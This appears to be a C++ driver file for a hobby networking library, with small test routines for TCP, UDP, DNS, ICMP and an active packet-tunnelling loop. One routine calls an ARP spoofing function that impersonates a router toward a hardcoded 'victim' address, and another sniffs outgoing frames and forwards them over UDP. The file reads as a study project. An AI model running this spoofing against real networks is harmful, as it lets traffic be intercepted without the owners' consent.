#include <iostream>
#include <vector>
#include <linux/if_ether.h>
#include <pcap/pcap.h>
#include <thread>
#include <net/if.h>
#include <sys/ioctl.h>

#include "linux/tcp/tcp_conn_client.h"
#include "linux/udp/udp_conn_client.h"
#include "linux/dns/dns_client.h"
#include "linux/ip4/ip4_conn_client.h"
#include "linux/icmp/icmp_conn_client.h"
#include "linux/ether/ethernet_conn_client.h"
#include "linux/ether/arp_conn_client.h"

#include "abstract/basic_gateway.h"
#include "abstract/basic_encapsulating_client.h"
#include "linux/data_link_layer/data_link_layer_gateway.h"

#define IP "127.0.0.1"
#define PORT 4444

int udp_main() {

    ip4_conn_client ip_client(IP);

    udp_conn_client client(PORT);
    client.ip_client = &ip_client;

    std::cout << "sending data" << std::endl;
    char *msg = "first";
    int len = strlen(msg);
    client.send_data(msg, len);

    char buff[6];
    memset(buff, '\x00', 6);
    client.recv_data(buff, 5);
    cout << "server: " << buff << endl;


    std::cout << "sending data" << std::endl;
    char *msg2 = "secnd";
    int len2 = strlen(msg2);
    client.send_data(msg2, len2);

    char buff2[6];
    memset(buff2, '\x00', 6);
    client.recv_data(buff2, 5);
    cout << "server: " << buff2 << endl;

    while (true) {

    }

    return 0;
}

int tcp_main() {
    std::cout << "Hello, World!" << std::endl;

    tcp_conn_client client(IP, PORT);
    client.conn();

    std::cout << "sending data" << std::endl;
    char *msg = "hello";
    cout << "sent " << client.send_data(msg, strlen(msg)) << " bytes" << endl;
    std::cout << "data sent" << std::endl;

    char buff[6];
    memset(buff, '\x00', 6);
    client.recv_data(buff, 5);
    cout << "server: " << buff << endl;


    std::cout << "sending data" << std::endl;
    char *msg2 = "secnd";
    cout << "sent " << client.send_data(msg2, strlen(msg2)) << " bytes" << endl;
    std::cout << "data sent" << std::endl;

    char buff2[6];
    memset(buff2, '\x00', 6);
    client.recv_data(buff2, 5);
    cout << "server: " << buff2 << endl;

    while (true) {

    }

    return 0;
}

int dns_main() {
    vector<string> hosts = {
            "wiki.osdev.org",
            "www.wix.com",
            "docs.google.com",
            "www.scs.stanford.edu",
            "yahho.com",
            "google.com",
            "youtube.com",
            "tradingview.com",
            "walla.co.il",
            "nasa.com",
            "medium.com",
    };

    ip4_conn_client ip_client("8.8.8.8");

    udp_conn_client udp_client(DNS_PORT);
    udp_client.ip_client = &ip_client;

    dns_client dns_client;
    dns_client.udp_client = &udp_client;

    for (string &str: hosts)
        dns_client.query(str);

    return 0;
}

int icmp_main() {
    char *str = "172.217.22.46";
//    char* str = "google.com";

    ip4_conn_client ip_client(str);

    icmp_conn_client icmp_client;
    icmp_client.ip_client = &ip_client;

    icmp_client.ping();
}

int arp_main() {

    ethernet_conn_client ether_client;

    arp_conn_client arp_client;
    arp_client.ether_client = &ether_client;


    string victim = "10.100.102.15";
    vector<pair<mac_addr, string>> victim_list = {
//            {arp_client.search_for_device(victim),victim}
            {{0x20, 0x7b, 0xd2, 0xaf, 0xdb, 0xc9}, victim}
    };
    arp_client.spoof_as_device("10.100.102.1", // router
                               victim_list);

}

void tunnel_main() {
    ip4_conn_client ip_client(IP);

    udp_conn_client udp_client(PORT);
    udp_client.ip_client = &ip_client;

    data_link_traffic traffic(false); // traffic coming out
    while (true) {
#define BUFF_LEN 512
        char buff[BUFF_LEN];
        memset(buff, 0, BUFF_LEN);

        int len = traffic.sniff_next_msg(buff, BUFF_LEN); // next message

        // tunnel through udp
        cout << "packet read. tunneling in udp len " << len << endl;
        udp_client.send_data(buff, len);
    }
}

int data_link_layer_fd;
struct sockaddr_ll dest_addr; // used for interface
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    cout << "Packet captured with len " << header->len << endl;


//    cout << "sent raw bytes: " << sendto(data_link_layer_fd,
//                                         pkt_data, header->len,
//                                         0,
//                                         reinterpret_cast<const sockaddr *>(&dest_addr), sizeof(dest_addr)) << endl;

//#define BUFF_LEN 20
//    char buff[BUFF_LEN];
//    memset(buff, 'a', BUFF_LEN);
//cout << "sent raw bytes: " << sendto(data_link_layer_fd,
//                                         buff, BUFF_LEN,
//                                         0,
//                                         reinterpret_cast<const sockaddr *>(&dest_addr), sizeof(dest_addr)) << endl;

}

char *dev = "enp0s3";
int main() {

//    // open fd
//    data_link_layer_fd = socket(
//            AF_PACKET,
//            SOCK_RAW,
//            htons(ETH_P_ALL)
//    );
//    if (data_link_layer_fd == -1) {
//        cerr << "data_link_layer_fd err" << endl;
//        printf("errno: %d\n", errno);
//        throw;
//    }
//
//    // get if_req
//    struct ifreq if_idx;
//    memset(&if_idx, 0, sizeof(struct ifreq));
//    strncpy(if_idx.ifr_name, dev, IFNAMSIZ - 1);
//
//    int temp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); // todo change to ALL?
//    if (ioctl(temp_fd, SIOCGIFINDEX, &if_idx) < 0)
//        perror("SIOCGIFINDEX");
//    close(temp_fd);
//
//    // set ll socket data
//    dest_addr.sll_ifindex = if_idx.ifr_ifindex;
//
//
//    // open the interface to be able to capture traffic
//    char errbuf[PCAP_ERRBUF_SIZE]; // Error string
//    pcap_t * traffic = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
//    if (traffic == nullptr) {
//        cerr << "can't open interface: " << dev << ", err: " << errbuf << endl;
//        throw;
//    }
//
//    pcap_loop(traffic, 0, packet_handler, NULL);

//    pcap_close(traffic);







//    udp_main();
//    tcp_main();
//    dns_main();
//    icmp_main();
//    arp_main();
    tunnel_main();

    return (0);
}


